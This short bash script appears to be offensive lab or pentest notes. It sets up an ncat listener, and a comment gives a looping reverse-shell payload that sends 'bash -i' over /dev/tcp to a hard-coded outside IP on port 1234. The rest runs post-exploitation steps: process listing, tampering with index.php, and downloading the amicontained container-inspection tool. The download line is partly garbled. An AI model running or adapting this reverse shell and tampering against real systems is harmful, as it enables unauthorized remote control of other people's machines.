#!/bin/bash

source ./00_common.sh

set -x

# Create command
# Setup ssh config
# On box
#   * apt install nmap
#   * ncat --listen 1234 --output $(mktemp /tmp/hack-XXXX.log)

# On exploit
# /bin/bash -c "while :; do nohup bash -i >& /dev/tcp/167.99.200.158/1234 0>&1; sleep 1; done"

# What can we do???

# Reverse shell

ps -ef

vi index.php
nano index.php
cat index.php
echo "hi" >> index.php

python --version
__get() { local URL="$1"; [ ! -f "${URL}" ]&& curl -LO curl -LO ${URL}; };
__get https://github.com/genuinetools/amicontained/releases/download/v0.4.7/amicontained-linux-amd64
ls